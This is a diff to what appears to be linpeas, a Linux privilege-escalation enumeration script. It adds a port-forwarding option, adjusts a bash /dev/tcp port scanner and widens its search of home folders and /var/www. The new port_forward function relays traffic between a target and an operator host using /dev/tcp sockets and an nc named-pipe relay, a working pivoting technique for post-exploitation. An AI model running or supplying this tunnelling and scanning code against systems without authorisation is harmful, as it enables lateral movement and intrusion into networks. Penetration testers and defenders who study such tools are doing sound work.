@@ -65,6 +65,7 @@ DEBUG=""
 AUTO_NETWORK_SCAN=""
 EXTRA_CHECKS=""
 REGEXES=""
+PORT_FORWARD=""
 THREADS="$( ( (grep -c processor /proc/cpuinfo 2>/dev/null) || ( (command -v lscpu >/dev/null 2>&1) && (lscpu | grep '^CPU(s):' | awk '{print $2}')) || echo -n 2) | tr -d "\n")"
 [ -z "$THREADS" ] && THREADS="2" #If THREADS is empty, put number 2
 [ -n "$THREADS" ] && THREADS="2" #If THREADS is null, put number 2
@@ -78,14 +79,17 @@ ${NC}This tool enum and search possible misconfigurations$DG (known vulns, user,
         ${YELLOW}    -t${BLUE} Automatic network scan & Internet conectivity checks - This option writes to files
         ${YELLOW}    -r${BLUE} Enable Regexes (this can take from some mins to hours)
         ${YELLOW}    -P${BLUE} Indicate a password that will be used to run 'sudo -l' and to bruteforce other users accounts via 'su'
-	${YELLOW}    -D${BLUE} Debug mode
+	      ${YELLOW}    -D${BLUE} Debug mode
 	
       ${GREEN}  Network recon:
         ${YELLOW}    -t${BLUE} Automatic network scan & Internet conectivity checks - This option writes to files
-	${YELLOW}    -d <IP/NETMASK>${BLUE} Discover hosts using fping or ping.$DG Ex: -d 192.168.0.1/24
+	      ${YELLOW}    -d <IP/NETMASK>${BLUE} Discover hosts using fping or ping.$DG Ex: -d 192.168.0.1/24
         ${YELLOW}    -p <PORT(s)> -d <IP/NETMASK>${BLUE} Discover hosts looking for TCP open ports (via nc). By default ports 22,80,443,445,3389 and another one indicated by you will be scanned (select 22 if you don't want to add more). You can also add a list of ports.$DG Ex: -d 192.168.0.1/24 -p 53,139
         ${YELLOW}    -i <IP> [-p <PORT(s)>]${BLUE} Scan an IP using nc. By default (no -p), top1000 of nmap will be scanned, but you can select a list of ports instead.$DG Ex: -i 127.0.0.1 -p 53,80,443,8000,8080
         $GREEN     Notice${BLUE} that if you specify some network scan (options -d/-p/-i but NOT -t), no PE check will be performed
+      
+      ${GREEN}  Port forwarding:
+        ${YELLOW}    -F LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT${BLUE} Execute linpeas to forward a port from a local IP to a remote IP
       
       ${GREEN}  Firmware recon:
         ${YELLOW}    -f </FOLDER/PATH>${BLUE} Execute linpeas to search passwords/file permissions misconfigs inside a folder
@@ -98,7 +102,7 @@ ${NC}This tool enum and search possible misconfigurations$DG (known vulns, user,
 	${YELLOW}    -q${BLUE} Do not show banner
         ${YELLOW}    -N${BLUE} Do not use colours$NC"
 
-while getopts "h?asd:p:i:P:qo:LMwNDterf:" opt; do
+while getopts "h?asd:p:i:P:qo:LMwNDterf:F:" opt; do
   case "$opt" in
     h|\?) printf "%s\n\n" "$HELP$NC"; exit 0;;
     a)  FAST="";EXTRA_CHECKS="1";;
@@ -117,7 +121,15 @@ while getopts "h?asd:p:i:P:qo:LMwNDterf:" opt; do
     t)  AUTO_NETWORK_SCAN="1";;
     e)  EXTRA_CHECKS="1";;
     r)  REGEXES="1";;
-    f)  SEARCH_IN_FOLDER=$OPTARG; ROOT_FOLDER=$OPTARG; REGEXES="1"; CHECKS="software_information,interesting_files,api_keys_regex";;
+    f)  SEARCH_IN_FOLDER=$OPTARG;
+    	if ! [ "$(echo -n $SEARCH_IN_FOLDER | tail -c 1)" = "/" ]; then #Make sure firmware folder ends with "/"
+	  SEARCH_IN_FOLDER="${SEARCH_IN_FOLDER}/"; 
+	fi;
+    	ROOT_FOLDER=$SEARCH_IN_FOLDER;
+	REGEXES="1";
+	CHECKS="procs_crons_timers_srvcs_sockets,software_information,interesting_files,api_keys_regex";;
+	
+    F)  PORT_FORWARD=$OPTARG;;
     esac
 done
 
@@ -510,11 +522,11 @@ TIMEOUT="$(command -v timeout 2>/dev/null)"
 STRACE="$(command -v strace 2>/dev/null)"
 STRINGS="$(command -v strings 2>/dev/null)"
 
-shscripsG="/0trace.sh|/alsa-info.sh|amuFormat.sh|/blueranger.sh|/crosh.sh|/dnsmap-bulk.sh|/dockerd-rootless.sh|/dockerd-rootless-setuptool.sh|/get_bluetooth_device_class.sh|/gettext.sh|/go-rhn.sh|/gvmap.sh|/kernel_log_collector.sh|/lesspipe.sh|/lprsetup.sh|/mksmbpasswd.sh|/power_report.sh|/setuporamysql.sh|/setup-nsssysinit.sh|/readlink_f.sh|/rescan-scsi-bus.sh|/start_bluetoothd.sh|/start_bluetoothlog.sh|/testacg.sh|/testlahf.sh|/unix-lpr.sh|/url_handler.sh|/write_gpt.sh"
+shscripsG="/0trace.sh|/alsa-info.sh|amuFormat.sh|/blueranger.sh|/crosh.sh|/dnsmap-bulk.sh|/dockerd-rootless.sh|/dockerd-rootless-setuptool.sh|/get_bluetooth_device_class.sh|/gettext.sh|/go-rhn.sh|/gvmap.sh|/kernel_log_collector.sh|/lesspipe.sh|/lprsetup.sh|/mksmbpasswd.sh|/pm-utils-bugreport-info.sh|/power_report.sh|/setuporamysql.sh|/setup-nsssysinit.sh|/readlink_f.sh|/rescan-scsi-bus.sh|/start_bluetoothd.sh|/start_bluetoothlog.sh|/testacg.sh|/testlahf.sh|/unix-lpr.sh|/url_handler.sh|/write_gpt.sh"
 
 notBackup="/tdbbackup$|/db_hotbackup$"
 
-cronjobsG=".placeholder|0anacron|0hourly|110.clean-tmps|130.clean-msgs|140.clean-rwho|199.clean-fax|199.rotate-fax|200.accounting|310.accounting|400.status-disks|420.status-network|430.status-rwho|999.local|anacron|apache2|apport|apt|aptitude|apt-compat|bsdmainutils|certwatch|cracklib-runtime|debtags|dpkg|e2scrub_all|exim4-base|fake-hwclock|fstrim|john|locate|logrotate|man-db.cron|man-db|mdadm|mlocate|ntp|passwd|php|popularity-contest|raid-check|rwhod|samba|standard|sysstat|ubuntu-advantage-tools|update-notifier-common|upstart|"
+cronjobsG=".placeholder|0anacron|0hourly|110.clean-tmps|130.clean-msgs|140.clean-rwho|199.clean-fax|199.rotate-fax|200.accounting|310.accounting|400.status-disks|420.status-network|430.status-rwho|999.local|anacron|apache2|apport|apt|aptitude|apt-compat|bsdmainutils|certwatch|cracklib-runtime|debtags|dpkg|e2scrub_all|exim4-base|fake-hwclock|fstrim|john|locate|logrotate|man-db.cron|man-db|mdadm|mlocate|ntp|passwd|php|popularity-contest|raid-check|rwhod|samba|standard|sysstat|ubuntu-advantage-tools|update-motd|update-notifier-common|upstart|"
 cronjobsB="centreon"
 
 processesVB='jdwp|tmux |screen | inspect |--inspect[= ]|--inspect$|--inpect-brk|--remote-debugging-port'
@@ -577,7 +589,7 @@ elif [ -f "/bin/bash" ] && ! [ -L "/bin/bash" ]; then
   FOUND_BASH="/bin/bash";
 fi
 if [ "$FOUND_BASH" ]; then
-  SCAN_BAN_GOOD="$YELLOW[+] $GREEN$FOUND_BASH${BLUE} is available for network discovery & port scanning$LG ($SCRIPTNAME can discover hosts and scan ports, learn more with -h)\n"
+  SCAN_BAN_GOOD="$YELLOW[+] $GREEN$FOUND_BASH${BLUE} is available for network discovery, port scanning and port forwarding$LG ($SCRIPTNAME can discover hosts, scan ports, and forward ports. Learn more with -h)\n"
 fi
 
 FOUND_NC=$(command -v nc 2>/dev/null)
@@ -826,8 +838,8 @@ tcp_recon (){
   for port in $PORTS; do
     for j in $(seq 1 254)
     do
-      if [ "$FOUND_BASH" ] && [ "$$TIMEOUT" ]; then
-        $TIMEOUT 5 $FOUND_BASH -c "(echo </dev/tcp/$IP3.$j/$port) 2>/dev/null && echo -e \"\n[+] Open port at: $IP3.$j:$port\"" &
+      if [ "$FOUND_BASH" ] && [ "$TIMEOUT" ]; then
+        $TIMEOUT 2.5 $FOUND_BASH -c "(echo </dev/tcp/$IP3.$j/$port) 2>/dev/null && echo -e \"\n[+] Open port at: $IP3.$j:$port\"" &
       elif [ "$NC_SCAN" ]; then
         ($NC_SCAN "$IP3"."$j" "$port" 2>&1 | grep -iv "Connection refused\|No route\|Version\|bytes\| out" | sed -${E} "s,[0-9\.],${SED_RED},g") &
       fi
@@ -946,6 +958,24 @@ discovery_port_scan (){
 }
 
 
+port_forward (){
+  LOCAL_IP=$1
+  LOCAL_PORT=$2
+  REMOTE_IP=$3
+  REMOTE_PORT=$4
+
+  echo "In your local machine execute:"
+  echo "cd /tmp; rm backpipe; mknod backpipe p;"
+  echo "nc -lvnp $LOCAL_PORT 0<backpipe | nc -lvnp 9009 1>backpipe"
+  echo ""
+  echo "Press any key when you have executed the commands"
+  read -n 1
+
+  bash -c "exec 3<>/dev/tcp/$REMOTE_IP/$REMOTE_PORT; exec 4<>/dev/tcp/$LOCAL_IP/9009; cat <&3 >&4 & cat <&4 >&3 &"
+  echo "If not error was indicated, your local port $LOCAL_PORT should be forwarded to $REMOTE_IP:$REMOTE_PORT"
+}
+
+
 ###########################################
 #---) Exporting history env variables (---#
 ###########################################
@@ -1031,11 +1061,45 @@ elif [ "$IP" ]; then
   exit 0
 fi
 
+if [ "$PORT_FORWARD" ]; then
+  if ! [ "$FOUND_BASH" ]; then
+    printf $RED"[-] Err: Port forwarding not possible, no bash in PATH\n"$NC;
+    exit 0
+  fi
+
+  LOCAL_IP="$(echo -n $PORT_FORWARD | cut -d ':' -f 1)"
+  LOCAL_PORT="$(echo -n $PORT_FORWARD | cut -d ':' -f 2)"
+  REMOTE_IP="$(echo -n $PORT_FORWARD | cut -d ':' -f 3)"
+  REMOTE_PORT="$(echo -n $PORT_FORWARD | cut -d ':' -f 4)"
+
+  if ! [ "$LOCAL_IP" ] || ! [ "$LOCAL_PORT" ] || ! [ "$REMOTE_IP" ] || ! [ "$REMOTE_PORT" ]; then
+    printf $RED"[-] Err: Invalid port forwarding configuration: $PORT_FORWARD. The format is: LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT\nFor example: 10.10.14.8:7777:127.0.0.1:8000"$NC;
+    exit 0
+  fi
+
+  #Check if LOCAL_PORT is a number
+  if ! [ "$(echo $LOCAL_PORT | grep -E '^[0-9]+$')" ]; then
+    printf $RED"[-] Err: Invalid port forwarding configuration: $PORT_FORWARD. The format is: LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT\nFor example: 10.10.14.8:7777:127.0.0.1:8000"$NC;
+  fi
+
+  #Check if REMOTE_PORT is a number
+  if ! [ "$(echo $REMOTE_PORT | grep -E '^[0-9]+$')" ]; then
+    printf $RED"[-] Err: Invalid port forwarding configuration: $PORT_FORWARD. The format is: LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT\nFor example: 10.10.14.8:7777:127.0.0.1:8000"$NC;
+  fi
+
+  port_forward "$LOCAL_IP" "$LOCAL_PORT" "$REMOTE_IP" "$REMOTE_PORT"
+  exit 0
+fi
+
 
 #Get HOMESEARCH
-HOMESEARCH="/home/ /Users/ /root/ $(cat /etc/passwd 2>/dev/null | grep "sh$" | cut -d ":" -f 6 | grep -Ev "^/root|^/home|^/Users" | tr "\n" " ")"
-if ! echo "$HOMESEARCH" | grep -q "$HOME" && ! echo "$HOMESEARCH" | grep -qE "^/root|^/home|^/Users"; then #If not listed and not in /home, /Users/ or /root, add current home folder
-  HOMESEARCH="$HOME $HOMESEARCH"
+if [ "$SEARCH_IN_FOLDER" ]; then
+  HOMESEARCH="${ROOT_FOLDER}home/ ${ROOT_FOLDER}Users/ ${ROOT_FOLDER}root/ ${ROOT_FOLDER}var/www/"
+else
+  HOMESEARCH="/home/ /Users/ /root/ /var/www $(cat /etc/passwd 2>/dev/null | grep "sh$" | cut -d ":" -f 6 | grep -Ev "^/root|^/home|^/Users|^/var/www" | tr "\n" " ")"
+  if ! echo "$HOMESEARCH" | grep -q "$HOME" && ! echo "$HOMESEARCH" | grep -qE "^/root|^/home|^/Users|^/var/www"; then #If not listed and not in /home, /Users/, /root, or /var/www add current home folder
+    HOMESEARCH="$HOME $HOMESEARCH"
+  fi
 fi
 GREPHOMESEARCH=$(echo "$HOMESEARCH" | sed 's/ *$//g' | tr " " "|") #Remove ending spaces before putting "|"
 
